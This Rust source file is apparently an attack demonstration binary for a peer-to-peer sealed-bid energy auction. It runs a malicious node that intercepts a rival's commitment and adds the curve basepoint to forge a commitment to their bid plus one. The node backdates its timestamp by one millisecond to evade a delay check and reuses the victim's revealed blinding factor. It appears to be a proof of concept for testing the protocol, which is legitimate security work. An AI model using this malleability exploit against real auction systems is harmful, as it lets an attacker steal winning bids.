#![allow(dead_code)] // 🔥 Tell Rust to ignore unused code warnings in this script
#[path = "../network.rs"]
mod network;

#[path = "../crypto.rs"]
mod crypto;

#[path = "../auction.rs"]
mod auction;
use std::fs;
use std::error::Error;
use tokio::{select, time};
use futures::StreamExt;
use libp2p::swarm::SwarmEvent;
use std::env;
// 🔥 Added SystemTime for physical timestamps
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use curve25519_dalek::constants::RISTRETTO_BASEPOINT_POINT;
use curve25519_dalek::ristretto::CompressedRistretto;

const CURRENT_AUCTION_ID: &str = "ENERGY_AUCTION_001";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("⚠️ Usage: cargo run --bin malleability_attack -- <listen_port> <bootstrap_address>");
        std::process::exit(1);
    }

    let listen_port: u16 = args[1].parse().expect("Invalid port number");
    let bootstrap_addr: libp2p::Multiaddr = args[2].parse().expect("Invalid bootstrap address");

    println!("========================================================");
    println!("  😈 MALICIOUS NODE INITIALIZED (MALLEABILITY SNIPER) 😈 ");
    println!("========================================================");

    let key_file = format!("meter_{}.key", listen_port);
    let new_key = if let Ok(bytes) = fs::read(&key_file) {
        libp2p::identity::Keypair::from_protobuf_encoding(&bytes).unwrap()
    } else {
        let k = libp2p::identity::Keypair::generate_ed25519();
        fs::write(&key_file, k.to_protobuf_encoding().unwrap()).unwrap();
        k
    };

    let local_peer_id = new_key.public().to_peer_id();
    println!("🦹 Attacker Peer ID: {}", local_peer_id);

    let mut swarm = network::setup_swarm(new_key, local_peer_id)?;
    let listen_addr: libp2p::Multiaddr = format!("/ip4/127.0.0.1/tcp/{}", listen_port).parse()?;
    swarm.listen_on(listen_addr)?;
    swarm.behaviour_mut().kademlia.set_mode(Some(libp2p::kad::Mode::Server));
    
    println!("🔗 Connecting to Honest Network: {}", bootstrap_addr);
    swarm.dial(bootstrap_addr)?;

    let mut state = auction::AuctionState::new();
    let topic = libp2p::gossipsub::IdentTopic::new("energy-auction");

    let mut has_attacked = false;
    let mut background_timer = time::interval(Duration::from_secs(1));

    loop {
        select! {
            _ = background_timer.tick() => {}

            event = swarm.select_next_some() => match event {
                SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                    println!("🤝 Infiltrated connection with honest peer: {}", peer_id);
                    swarm.behaviour_mut().gossipsub.add_explicit_peer(&peer_id);
                },
                SwarmEvent::Behaviour(network::AuctionNetworkBehaviourEvent::Gossipsub(libp2p::gossipsub::Event::Message { message, .. })) => {
                    if let Ok(parsed_msg) = serde_json::from_str::<network::NetworkMessage>(&String::from_utf8_lossy(&message.data)) {
                        
                        // 🔥 Extract the incoming physical timestamp
                        let incoming_timestamp = match &parsed_msg {
                            network::NetworkMessage::Commit { timestamp, .. } => *timestamp,
                            network::NetworkMessage::Reveal { timestamp, .. } => *timestamp,
                        };

                        match parsed_msg {
                            network::NetworkMessage::Commit { bidder_id, commitment, .. } => {
                                if !has_attacked && bidder_id != local_peer_id.to_string() {
                                    println!("\n🎯 TARGET SPOTTED! Intercepted commitment from {}", bidder_id);
                                    println!("🧬 Initiating Homomorphic Addition (+1G)...");

                                    if let Ok(commitment_bytes) = hex::decode(&commitment) {
                                        let mut bytes_array = [0u8; 32];
                                        bytes_array.copy_from_slice(&commitment_bytes);
                                        
                                        if let Some(target_point) = CompressedRistretto(bytes_array).decompress() {
                                            
                                            let evil_point = target_point + RISTRETTO_BASEPOINT_POINT;
                                            let evil_hex = hex::encode(evil_point.compress().as_bytes());
                                            
                                            // 🔥 THE NEW ATTACK MATH: Add exactly 1 millisecond to their timestamp!
                                            // This perfectly bypasses the MAX_NETWORK_DELAY trap but guarantees we are Last-In!
                                            let attack_timestamp = incoming_timestamp + 1;
                                            
                                            let attack_msg = network::NetworkMessage::Commit {
                                                auction_id: CURRENT_AUCTION_ID.to_string(),
                                                timestamp: attack_timestamp, // 🔥 Using new timestamp
                                                bidder_id: local_peer_id.to_string(),
                                                commitment: evil_hex.clone(),
                                            };

                                            let json_payload = serde_json::to_string(&attack_msg).unwrap();
                                            let _ = swarm.behaviour_mut().gossipsub.publish(topic.clone(), json_payload.as_bytes());
                                            
                                            state.received_commitments.insert(local_peer_id.to_string(), (evil_hex, attack_timestamp));
                                            
                                            println!("💣 FORGED COMMITMENT SENT! My Timestamp is {} (+1ms), guaranteeing I am Last-In!", attack_timestamp);
                                            has_attacked = true;
                                        }
                                    }
                                }
                            },
                            network::NetworkMessage::Reveal { bidder_id, bid, blind_hex, .. } => {
                                if has_attacked && bidder_id != local_peer_id.to_string() {
                                    println!("\n🏴‍☠️ Target {} revealed! Stealing their blinding factor...", bidder_id);
                                    
                                    let evil_bid = bid + 1; 
                                    let reveal_timestamp = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_millis() as u64;

                                    let steal_msg = network::NetworkMessage::Reveal {
                                        auction_id: CURRENT_AUCTION_ID.to_string(),
                                        timestamp: reveal_timestamp, // 🔥 Using new timestamp
                                        bidder_id: local_peer_id.to_string(),
                                        bid: evil_bid,
                                        blind_hex: blind_hex.clone(), 
                                    };

                                    let json_payload = serde_json::to_string(&steal_msg).unwrap();
                                    let _ = swarm.behaviour_mut().gossipsub.publish(topic.clone(), json_payload.as_bytes());
                                    println!("🚀 Broadcasting forged Reveal payload: Bid {}, stolen key!", evil_bid);
                                }
                            }
                        }
                    }
                },
                _ => {}
            }
        }
    }
}